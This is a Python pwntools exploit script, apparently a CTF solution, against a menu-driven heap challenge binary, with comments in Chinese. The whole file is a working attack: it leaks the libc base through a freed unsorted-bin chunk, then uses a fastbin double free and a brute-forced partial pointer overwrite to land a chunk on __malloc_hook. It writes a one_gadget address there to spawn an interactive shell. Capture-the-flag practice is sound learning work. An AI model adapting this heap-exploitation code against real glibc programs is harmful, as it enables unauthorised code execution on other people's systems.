from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
# enable this when using ssh & tmux
context.terminal = ['tmux', 'splitw', '-h']
context.timeout = 1

p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


# gdb.attach(p, "c")

# 循环爆破
while True:
    try:
        # 泄露libc基址
        add_chunk(0, 0x400)
        add_chunk(1, 0x400)
        delete_chunk(0)
        show_chunk(0)
        tmp = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
        # print("tmp", hex(tmp))
        libc.address = tmp - 0x39bb78
        print("libc.address", hex(libc.address))
        # 清除所有chunk
        delete_chunk(1)

        # |---chunk0(0x70)---|---chunk1(0xA0)---|---chunk2(0x70)---|
        add_chunk(0, 0x68)
        add_chunk(1, 0x98)
        add_chunk(2, 0x68)

        # |---chunk0(0x70)---|---chunk3(0x30)---|---chunk1(0x70)---|---chunk2(0x70)---|
        delete_chunk(1)
        add_chunk(3, 0x28)
        add_chunk(1, 0x68)
        # chunk1.FD = chunk(&__malloc_hook - 0x23)
        # !!!以1/16的概率正确指向target!!!
        edit_chunk(1, p16(0x4b10 - 0x23))
        # fastbin double free
        # fastbins[0x70] -> chunk2 -> chunk0 -> chunk2
        delete_chunk(2)
        delete_chunk(0)
        delete_chunk(2)
        # fastbins[0x70] -> chunk0 -> chunk2
        add_chunk(10, 0x68)
        # fastbins[0x70] -> chunk0 -> chunk2 -> chunk1 -> chunk(&__malloc_hook - 0x23)
        edit_chunk(10, p8(0xa0))

        add_chunk(0, 0x68)
        add_chunk(0, 0x68)
        add_chunk(0, 0x68)
        add_chunk(0, 0x68) # get chunk(&__malloc_hook - 0x23)

        # __malloc_hook = one_gadget
        one_gadgets = [0x3f3e6, 0x3f43a, 0xd5c07]
        og = one_gadgets[2] + libc.address
        edit_chunk(0, b"a" * 0x13 + p64(og))

        # exec one_gadget
        add_chunk(10, 0x100)

        p.interactive()
    except KeyboardInterrupt:
        exit(0)
    except:
        p.close()
    p = process([elf.path])
